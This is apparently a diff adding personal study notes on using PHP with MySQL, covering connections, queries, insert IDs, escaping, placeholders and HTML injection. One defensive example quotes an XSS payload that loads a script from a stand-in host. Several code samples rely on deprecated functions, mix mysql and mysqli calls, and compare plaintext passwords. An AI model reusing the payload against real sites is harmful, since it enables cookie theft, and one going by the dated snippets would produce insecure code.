@@ -1,0 +1,378 @@
+PHP MySQL Combined 
+
+The reason for using PHP as an interface to MySQL is to format the results of SQL queries in a form visible in a web page. 
+
+The Process 
+
+-> Connect to MySQL 
+-> Select the database to use 
+-> Build a query string (a) 
+-> Perform the query (b) 
+-> Retrieve the results and output it to a webpage (c) 
+-> Repeat (a) to (c) untill desired data have been retrieved 
+-> Disconnect from MySQL 
+
+The login.php file 
+
+The hostname localhost should work as long as you’re using a MySQL database on your local system, and the database publications should work if you’re typing in the examples I’ve used so far.(not here) 
+
+<?php // login.php 
+$db_hostname = 'localhost'; 
+$db_database = 'publications'; 
+$db_username = 'username'; 
+$db_password = 'password'; 
+?> 
+
+Connecting to MySQL 
+
+Now that you have the login.php file saved, you can include it in any PHP files that will need to access the database by using the require_once statement. 
+
+sample: 
+<?php 
+require_once 'login.php'; 
+$db_server = mysql_connect($db_hostname, $db_username, $db_password); 
+
+if (!$db_server) 
+die("Unable to connect to MySQL: " . mysql_error()); 
+?> 
+
+When attemping this, there will be an error: 
+
+Deprecated: mysql_connect(): The mysql extension is deprecated and will be removed in the future: use mysqli or PDO instead in C:\Program Files (x86)\EasyPHP-DevServer-14.1VC11\data\localweb\projects\sql_php\index.php on line 4 
+
+Why? 
+The entire ext/mysql PHP extension, which provides all functions named with the prefix mysql_, is officially deprecated as of PHP v5.5.0 and will be removed in the future. 
+
+How? 
+As the error message suggests, there are two other MySQL extensions that you can consider: MySQLi and PDO_MySQL, either of which can be used instead of ext/mysql 
+
+Here is the correct code: 
+<?php 
+require_once "login.php"; 
+
+$db_connect = mysqli_connect($db_hostname, $db_username, $db_password, $db_database); 
+
+if (!$db_connect) die("Unable to connect to MySQL: " . mysql_error()); 
+?> 
+
+Use MySQLi: 
+in relation to PHP, MySQL is the old database driver, and MySQLi is the Improved driver. MySQLi takes advantage of the newer features of MySQL 5. Lifted verbatim from the php.net site: 
+
+Object-oriented interface 
+Support for Prepared Statements 
+Support for Multiple Statements 
+Support for Transactions 
+Enhanced debugging capabilities 
+Embedded server support 
+
+You have the choice of using mysql, mysqli, or PDO essentially. 
+
+Select a database 
+
+<?php 
+mysql_select_db($db_database) 
+or die("Unable to select database: " . mysql_error()); 
+?> 
+
+I don't think you need to do this because mysqli_connect has done this 
+
+Building and executing a query 
+
+<?php 
+$query = "SELECT * FROM bank_accounts;"; 
+$result = mysqli_query($db_connect, $query); // execute 
+
+if (!$result) die ("Database access failed: " . mysql_error()); 
+?> 
+
+For successful SELECT, SHOW, DESCRIBE, or EXPLAIN queries it will return a mysqli_result object. For other successful queries it will return TRUE. FALSE on failure 
+
+Fetching a result 
+The simplest way to do this is to fetch the cells you want, one at a time, using the mysql_result function. 
+
+A complete example; 
+Fetching results one cell at a time 
+----------------------------------- 
+<?php // query.php 
+require_once 'login.php'; 
+$db_server = mysql_connect($db_hostname, $db_username, $db_password); 
+
+if (!$db_server) die("Unable to connect to MySQL: " . mysql_error()); 
+
+mysql_select_db($db_database) 
+or die("Unable to select database: " . mysql_error()); 
+
+$query = "SELECT * FROM classics"; 
+$result = mysql_query($query); 
+
+if (!$result) die ("Database access failed: " . mysql_error()); 
+
+$rows = mysql_num_rows($result); 
+
+for ($j = 0 ; $j < $rows ; ++$j) 
+{ 
+echo 'Author: ' . mysql_result($result,$j,'author')   . '<br />'; 
+echo 'Title: ' . mysql_result($result,$j,'title') . '<br />'; 
+echo 'Category: ' . mysql_result($result,$j,'category') . '<br />'; 
+echo 'Year: ' . mysql_result($result,$j,'year') . '<br />'; 
+echo 'ISBN: ' . mysql_result($result,$j,'isbn') . '<br /><br />'; 
+} 
+?> 
+------------------------------------- 
+The above code is for older php; In using MySQLi, here are the modifications: 
+
+mysql_result cannot be replaceb by 'mysqli_result' since there is no such function; mysqli_result is actually an object 
+
+But here is a function that makes it 'look like' mysql_result: 
+function mysqli_result($res, $row, $field=0) { 
+$res->data_seek($row); 
+$datarow = $res->fetch_array(); 
+return $datarow[$field]; 
+} 
+
+Note: uou may want to name it something other than mysqli_result so as to avoid thinking it's an actual, built-in function 
+
+Besides, the above code does not appear to be good style (not efficient); It may be better to use while loop with mysqli_fetch_assoc($result) 
+
+my code: 
+
+while ($row = mysqli_fetch_assoc($result)) 
+{ 
+echo 'Holder: ' . $row['holder'] . '<br />'; 
+echo 'Account Number: ' . $row['account_number'] . '<br />'; 
+echo 'Balance: ' . $row['balance'] . '<br />'; 
+echo 'Open Date: ' . $row['open_date'] . '<br />'; 
+echo '<br />'; 
+} 
+
+Closing a connection 
+
+<?php 
+mysql_close($db_server); 
+?> 
+
+Practical Examples: 
+
+Creating a table: 
+$query = "CREATE TABLE cats ( 
+id SMALLINT NOT NULL AUTO_INCREMENT, 
+family VARCHAR(32) NOT NULL, 
+name VARCHAR(32) NOT NULL, 
+age TINYINT NOT NULL, 
+PRIMARY KEY (id) 
+)"; 
+
+Describing a table: 
+$query = "DESCRIBE cats"; 
+
+$result = mysql_query($query); 
+if (!$result) die ("Database access failed: " . mysql_error()); 
+$rows = mysql_num_rows($result); 
+
+echo "<table><tr> <th>Column</th> <th>Type</th> 
+<th>Null</th> <th>Key</th> </tr>"; 
+
+for ($j = 0 ; $j < $rows ; ++$j) 
+{ 
+$row = mysql_fetch_row($result); 
+echo "<tr>"; 
+for ($k = 0 ; $k < 4 ; ++$k) echo "<td>$row[$k]</td>"; 
+echo "</tr>"; 
+} 
+
+echo "</table>"; 
+
+Adding Data: 
+$query = "INSERT INTO cats VALUES(NULL, 'Lion', 'Leo', 4)"; 
+
+Deleting Data: 
+$query = "DELETE FROM cats WHERE name='Growler'"; 
+
+Using AUTO_INCREMENT 
+
+When using AUTO_INCREMENT, you cannot know what value has been given to a column before a row is inserted. Instead, if you need to know it, you must ask MySQL afterward using the mysql_insert_id function. This need is common: for instance, when you process a purchase, you might insert a new customer into a Customers table and then refer to the newly created CustId when inserting a purchase into the purchase table. 
+
+Example 10-12 can be rewritten as Example 10-16 to display this value after each insert. 
+Example 10-16. Adding data to cats table and reporting the insertion id 
+
+<?php 
+require_once 'login.php'; 
+$db_server = mysql_connect($db_hostname, $db_username, $db_password); 
+if (!$db_server) die("Unable to connect to MySQL: " . mysql_error()); 
+mysql_select_db($db_database) 
+or die("Unable to select database: " . mysql_error()); 
+
+$query = "INSERT INTO cats VALUES(NULL, 'Lynx', 'Stumpy', 5)"; 
+
+$result = mysql_query($query); 
+echo "The Insert ID was: " . mysql_insert_id(); 
+if (!$result) die ("Database access failed: " . mysql_error()); 
+?> 
+
+
+Using insert IDs 
+
+It’s very common to insert data in multiple tables: a book followed by its author, or a customer followed by their purchase, and so on. When doing this with an auto-increment column, you will need to retain the insert ID returned for storing in the related table. 
+
+For example, let’s assume that these cats can be “adopted” by the public as a means of raising funds, and that when a new cat is stored in the cats table, we also want to create a key to tie it to the animal’s adoptive owner. The code to do this is similar to that in Example 10-16, except that the returned insert ID is stored in the variable $insertID, and is then used as part of the subsequent query: 
+
+$query = "INSERT INTO cats VALUES(NULL, 'Lynx', 'Stumpy', 5)"; 
+$result = mysql_query($query); 
+$insertID = mysql_insert_id(); 
+
+$query = "INSERT INTO owners VALUES($insertID, 'Ann', 'Smith')"; 
+$result = mysql_query($query); 
+
+Now the cat is connected to its “owner” through the cat’s unique ID, which was created automatically by AUTO_INCREMENT. 
+
+But there’s a slight window of opportunity for an error to slip in. Suppose that two people visit the website at the same time and submit new information, causing the web server to run your program twice at the same time. (Web servers can run several programs at the same time to speed up response time.) The second visitor might insert a new cat just before the first visitor’s program issues mysql_insert_id. This is a rare but serious problem, because the first person could end up being associated with the second person’s cat. 
+
+So a completely safe procedure for linking tables through the insert ID is to use locks (or transactions, as described in Chapter 9). It can slow down response time a bit when there are many people submitting data to the same table, but it can also be worth it. The sequence is: 
+
+Lock the first table (e.g., cats). 
+
+Insert data into the first table. 
+
+Retrieve the unique ID from the first table through mysql_insert_id. 
+
+Unlock the first table. 
+
+Insert data into the second table. 
+
+The lock can safely be released before inserting data into the second table, because the insert ID has been retrieved and is stored in a program variable. A transaction can also be used instead of locking, but that slows down the MySQL server even more. 
+
+To Prevent Malicious String (SQL injection): 
+If some user enters "#" or stuffs like that, it will ruin the query 
+
+How to properly sanitize user input for MySQL 
+
+<?php 
+function mysql_fix_string($string) 
+{ 
+if (get_magic_quotes_gpc()) $string = stripslashes($string); 
+return mysql_real_escape_string($string); 
+} 
+?> 
+
+Then: 
+How to safely access MySQL with user input 
+
+<?php 
+$user = mysql_fix_string($_POST['user']); 
+$pass = mysql_fix_string($_POST['pass']); 
+$query = "SELECT * FROM users WHERE user='$user' AND pass='$pass'"; 
+
+function mysql_fix_string($string) 
+{ 
+if (get_magic_quotes_gpc()) $string = stripslashes($string); 
+return mysql_real_escape_string($string); 
+} 
+?> 
+
+Warning 
+
+Remember that you can use mysql_escape_string only when a MySQL database is actively open; otherwise, an error will occur. 
+
+Another way! Using Placeholders 
+
+Using placeholders 
+
+Another way—this one virtually bulletproof—to prevent SQL injections is to use a feature called placeholders. The idea is to predefine a query using ? characters where the data will appear. Then, instead of calling a MySQL query directly, you call the predefined one, passing the data to it. This has the effect of ensuring that every item of data entered is inserted directly into the database and cannot be interpreted as SQL queries. In other words, SQL injections become impossible. 
+
+Example: 
+
+In command line: 
+
+PREPARE statement FROM "INSERT INTO classics VALUES(?,?,?,?,?)"; 
+
+SET @author = "Emily Brontë", 
+@title = "Wuthering Heights", 
+@category = "Classic Fiction", 
+@year = "1847", 
+@isbn = "9780553212587"; 
+
+EXECUTE statement USING @author,@title,@category,@year,@isbn; 
+
+DEALLOCATE PREPARE statement; 
+
+The first command prepares a statement called statement for inserting data into the classics table. As you can see, in place of values or variables for the data to insert, the statement contains a series of ? characters. These are the placeholders. 
+
+The next five lines assign values to MySQL variables according to the data to be inserted. Then the predefined statement is executed, passing these variables as parameters. Finally, the statement is removed, in order to return the resources it was using. 
+
+In PHP, the code for this procedure looks like Example 10-21 (assuming that you have created login.php with the correct details to access the database). 
+
+With PHP: 
+
+<?php 
+require 'login.php'; 
+
+$db_server = mysql_connect($db_hostname, $db_username, $db_password); 
+if (!$db_server) die("Unable to connect to MySQL: " . mysql_error()); 
+mysql_select_db($db_database) 
+or die("Unable to select database: " . mysql_error()); 
+
+$query = 'PREPARE statement FROM "INSERT INTO classics 
+VALUES(?,?,?,?,?)"'; 
+mysql_query($query); 
+
+$query = 'SET @author = "Emily Brontë",' . 
+'@title = "Wuthering Heights",' . 
+'@category = "Classic Fiction",' . 
+'@year = "1847",' . 
+'@isbn = "9780553212587"'; 
+mysql_query($query); 
+
+$query = 'EXECUTE statement USING @author,@title,@category,@year,@isbn'; 
+mysql_query($query); 
+
+$query = 'DEALLOCATE PREPARE statement'; 
+mysql_query($query); 
+?> 
+
+Once you have prepared a statement, until you deallocate it, you can use it as often as you wish. This approach is more efficient than creating the entire statement from scratch on each pass through the loop. 
+
+Preventing HTML Injection 
+
+This occurs when you allow HTML, or more often JavaScript code, to be input by a user and then displayed back by your website. One place this is common is in a comment form. What most often happens is that a malicious user will try to write code that steals cookies from your site’s users, allowing him or her to discover username and password pairs or other information. Even worse, the malicious user might launch an attack to download a Trojan onto a user’s computer. 
+
+But preventing this is as simple as calling the htmlentities function, which strips out all HTML markup codes and replaces them with a form that displays the characters, but does not allow a browser to act on them. For example, consider the following HTML: 
+
+<script src='http://x.com/hack.js'> </script><script>hack();</script> 
+
+This code loads in a JavaScript program and then executes malicious functions. But if it is first passed through htmlentities, it will be turned into the following, totally harmless string: 
+
+<script src='http://x.com/hack.js'> 
+</script><script>hack();</script> 
+
+**Stack overflow answer: 
+As many others have said, htmlentities() will do the trick... but it will look like shit. 
+
+Wrap it up with a <pre> tag and you'll preserve your indentation. 
+
+echo '<pre>'; 
+echo htmlspecialchars($YOUR_HTML); 
+echo '</pre>'; 
+
+
+
+----------------------------------------- 
+How to safely access MySQL and prevent XSS attacks 
+
+<?php 
+$user = mysql_entities_fix_string($_POST['user']); 
+$pass = mysql_entities_fix_string($_POST['pass']); 
+$query = "SELECT * FROM users WHERE user='$user' AND pass='$pass'"; 
+
+function mysql_entities_fix_string($string) 
+{ 
+return htmlentities(mysql_fix_string($string)); 
+} 
+
+function mysql_fix_string($string) 
+{ 
+if (get_magic_quotes_gpc()) $string = stripslashes($string); 
+return mysql_real_escape_string($string); 
+} 
+?> 
+
+
